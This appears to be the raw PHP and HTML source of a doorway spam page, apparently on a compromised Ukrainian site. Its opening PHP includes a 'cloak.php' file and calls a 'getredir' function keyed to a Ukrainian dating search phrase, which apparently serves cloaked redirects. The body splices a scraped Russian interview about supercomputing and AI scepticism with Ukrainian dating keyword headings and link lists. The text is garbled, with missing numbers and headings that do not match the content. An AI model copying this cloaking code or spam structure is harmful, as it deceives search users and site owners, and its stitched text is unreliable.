<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bf%d1%80%d0%be%d1%81%d1%82%d0%be+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%bf%d0%be%d1%80%d1%83%d1%87+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%ba%d0%b0+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Свайпни мене, якщо зможеш</title>
	<meta name="description" content="Спробу зав'язати відносини можуть просто не помітити. Плюс, здається, один: тут охочіше викладають справжні фото. Тепер про мінуси спеціалізованих." />
	<link rel="canonical" href="https://masage.od.ua/img/208/soni-prosto-znayomstva-poruch.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/184/wode-znayomstva-znovu-v.php">знайомства знову в Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/418/waly-msto-znayomstv.php">місто знайомств в Володимир-Волинський Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/137/zyp-bezkoshtovn-veb.php">безкоштовні веб - сайти знайомств у Windows Кагарлик Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/352/tut-znayomstva-z.php">знайомства з дівчиною з Росії Камянка-Бузька Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/247/sizo-pdklyuchiti-veb.php">підключити веб - сайти в Березне Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Просто знайомства поруч Українка Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Все знают, что произошло с тех пор с расчетами на процессорах Nvidia. И вот недавно компания выпустила пресс-релиз о том, что они все-таки сделали этот компьютер, один из самых быстрых в мире.</p><strong><a id='t1'></a><h2>Reporters. | Свайпни мене, якщо зможеш — Reporters.</h2></strong><p>Еще мы были в Mellanox, это производитель очень быстрых сетевых интерфейсов для суперкомпьютеров. Предложили им сделать хороший интерфейс с картами Nvidia. Нам ответили, что нет, на это надо 2 миллиарда, так что этого никогда не будет. А 4 года назад они это сделали. Не думаю, что это я на них как-то повлиял, просто «общее сознание» в IT так вот на них давило.</p>
<p>Потом оказалось, что моя наука закончилась. В том смысле, что мы решили все проблемы, которые обещали решить, а до  экзаскейла ничего нового не решится. Экзаскейл был не близок. Франция не наняла никого в этой науке за последние 10 лет на постоянные позиции. Я решил: ну его ждать 10 лет, можно применить свои знания и в других областях.</p>
		
			<br><ol>
			
				<li>Заміжня за американцем: виклики та лайфхаки.</li>
			
				<li>Знайомства / Кохання / Дружба / Секс / Україна.</li>
			
				<li>Yudin Gennady.</li>
			
			</ol>
		
	<p>И устроился в Национальный институт по исследованиям в области информатики и автоматики INRIA просто как специалист, разбирающийся в high performance computing. Много чем. Я выбирал, что делать, каким исследовательским группам помогать производить хорошие расчеты. Потому что люди выходят из университетов, у них нет опыта, и они пишут код, который бежит ю часть процента по эффективности, а это можно исправить.</p>
<p>Вообще, я там занимался чем угодно — от оптимизации биореакторов до пермакультуры, у нас был проект по применению искусственного интеллекта. Пермакультура — это когда ты высаживаешь разные злаки вместе в определенной последовательности, для того чтобы почва оставалась плодородной. Я предложил ставить сенсоры на кислотность почвы, камеры, чтобы они записывали, и загнать это все в AI вместе с результатами по урожаю. Это называется supervised learning, из  х. Думаю, сейчас есть множество стартапов, которые это делают. У меня не было никогда особого желания уходить в стартапы, даже на сладкие предложения из Кремниевой долины.</p>
		
			<br><ul>
			
				<li>Interview with Military Chaplain Sister Simeone, Conducted in Kiev, Ukraine, 8 November (UKR).</li>
			
				<li>найкраще місце підключити в Камянка Україна.</li>
			
				<li>одна ніч підключення поблизу Жовква Україна.</li>
			
			</ol>
		
	<p>Особенно не хотелось переезжать, потому что мой сын попал в лучший лицей во Франции, в Долине таких нет. Франция весьма демократична, с развитым социализмом. Как когда-то в Киеве я перешел из обычной школы на окраине в  ю, так многие дети из Парижа и области попадают в самые интенсивные по обучению лицеи. Так что зарплаты зарплатами, а в Штатах университеты стоят столько, что мне никаких тысяч не хватит, чтобы оплатить сравнимое высшее образование. Могу рассказать про этот институт такую историю. Это были какие-то антенны для мобильных устройств, что-то такое.</p>
<p>И его какой-то американец сразу пригласил к себе в компанию работать, предложил намного больше денег. А тот говорит: «Ладно, но вы знаете, у нас каникулы по 2 месяца, так что вот через 2 месяца я могу переехать». И этот человек а это был Стив Джобс принял очень важное решение, дождался его, назначил начальником отдела по мобильной связи в своей корпорации. У меня в детстве на полке были книги на русском об искусственном интеллекте, потому что моя мама работала в компьютерном центре. И это была очень популярная штука в  х годах. Пока это все не пошло на спад, когда люди поняли, что не работает.</p>
<p>Один из основателей AI недавно у нас выступал с докладом и сказал, что в  году у него было  студентов, а в  м осталось  Кто-то из SAP мне рассказал, что они все теперь называют artificial intelligence и даже наняли выдающегося советского математика Владимира Вапника, который был одним из основателей этого дела. Все эти вещи были известны еще в  е годы, просто толку особенного не было, они не могли их продать. Теперь могут, а результаты те же, эффективность та же, что была в  х, но теперь в индустрии есть ощущение, что это важно и нужно.</p>
<p>И как сказал один из встретившихся мне стартаперов: «И мы на этом ощущении будем дальше ездить». Какие-то тараканьи бега, в общем. У нас во Франции тоже есть разнообразные венчурные инвесторы, которые, грубо говоря, тебе предлагают любые деньги под любые идеи. То есть, если бы я хотел просто взять их деньги, достаточно было бы сделать простой proof-of-concept и бизнес-план в области AI. Но, к сожалению или к счастью, я разобрался примерно, как это работает. И работает оно очень плохо. Ну, скажем, среди врачей есть куча не очень способных, и мы уже точно знаем, что благодаря AI можем лучше, чем врачи, определять некоторые виды рака, например.</p><a id='t2'></a><h3>OBYAVA.ua: знайомства онлайн в Україні</h3><p>Их интересуют только бюрократические сертификации и их собственная прибыль. Весь оптимизм людей, которые говорят, что выяснили, как лечить рак кожи, сталкивается с нежеланием системы как-то это учитывать. А что там будет с людьми, грубо говоря, никого не интересует, потому что их премия от этого не зависит. Я считаю, что на текущем уровне наших вычислительных возможностей нет никакой вероятности, что в области искусственного интеллекта произойдет какая-нибудь важная революция. Например, инженер Nvidia на какой-то конференции сказал мне в личной беседе, что надо в 10 раз увеличить компьютинг, мощность, чтобы примерно справляться с self-driving car.</p>
<p>В 10 раз они не увеличатся в ближайшие годы, да и он, наверное, оптимист.</p>
		
	<p>Но это, вероятно, решаемая проблема, есть более сложные. С пониманием текста все очень плохо, с генерацией текста еще хуже. Кошек от собак мы отличаем, и породы собак тоже. Вот ребенку надо одну кошку показать, и он уже будет знать всех кошек. С конволюционными сетями все сложнее. Мы не знаем точно почему, возможно, просто потому, что у нас в мозгу огромное количество нейронов. Я думаю, что рано или поздно мы научимся делать эти нейроны в hardware, и тогда, может, что-то улучшится. Но большая часть капитализма не о том, чтобы понять тебя, для чего и служит artificial intelligence, а для того, чтобы впарить тебе что-то, что не нужно.</p><img src="https://lookaside.fbsbx.com/lookaside/crawler/media/?media_id=1998014573813339" alt="'+videTitle+'" style="max-width: 480px; max-height: 480px;"/><p>Для этого не надо особо думать, как тебя обмануть, подбирать что-то. Главное, просто сделать много рекламы, развесить много флагов, заставить всех говорить о чем-то. А для рекламы никакой искусственный интеллект не нужен. Ну и опять с учетом того, что планета горит, рекламу надо запретить, давайте будем честными. Вообще, цифровая экономика сама по себе — это худшее, что случилось с человечеством за последние  лет.</p><a id='t3'></a><h3>Account Options</h3><p>Я не луддит и активно пользуюсь многими результатами цифровой революции, но, как обычно, мы не могли все не испортить. Когда-то появилось сельское хозяйство, и мы уничтожили дикую природу в угоду своим аппетитам.</p>
		
			
				<div>Подаруй мені щастя. 1 серія</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/9ugSKg1ps7I' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Потом индустриализация сделала все города черными, а войны прибыльными. Теперь цифровая экономика забрала всех умных людей, заставила их заниматься полной фигней вроде создания приложений, которыми никто не пользуется, или написания кода, который будет забыт через два года. Благодаря тому, что нас наконец-то начали хорошо кормить и вообще началось серьезное образование, мы могли бы произвести суперцивилизацию.</p><strong><a id='t4'></a><h2>Кохання на іншому боці землі: як китайці одружуються з українками</h2></strong><p>Вместо этого у нас телефонная ерунда, результат которой нулевой. Или вот в прошлом году 5 миллиардов было вложено в блокчейн, а это примерно половина того, что Франция тратит на высшее образование. О результатах все в курсе. Вместо того чтобы ученые думали, как улучшить нашу жизнь, как бороться с реальными проблемами, мне, например, предлагают в два раза больше зарплату за то, чтобы делать Facebook-бота, который будет суммаризировать новости.</p>
<p>И вот все эти люди, которые продались и ушли делать ботов, могли бы думать о чем-то большем. Я не могу их обвинять, потому что понимаю: государство нас поставило в такую ситуацию, что я тоже облизываюсь на другие зарплаты. Но мне приятно знать: то, что я делаю, хоть как-то полезно.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/137/vamel-merezha-znayomstv-poblizu.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/406/meg-znayomstva-v.php">знайомства в Інтернеті поблизу Люботин Україна</a></li><li><a href="https://masage.od.ua/img/494/casat-merezha-znayomstv.php">мережа знайомств Ялта Україна</a></li><li><a href="https://masage.od.ua/img/471/sora-sayti-znayomstv.php">сайти знайомств місто Ладижин Україна</a></li><li><a href="https://masage.od.ua/img/471/kil-znayomstva-shvidkst.php">знайомства швидкість знайомства в Волочиськ Україна</a></li><li><a href="https://masage.od.ua/img/137/fobe-mstsya-pdklyuchennya-yagotin.php">місця підключення Яготин Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#t1'>Reporters. | Свайпни мене, якщо зможеш — Reporters.</a></li>
<li><a href='#t2'>OBYAVA.ua: знайомства онлайн в Україні</a></li>
<li><a href='#t3'>Account Options</a></li>
<li><a href='#t4'>Кохання на іншому боці землі: як китайці одружуються з українками</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/184/qusew-fotograf-znayomstv.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>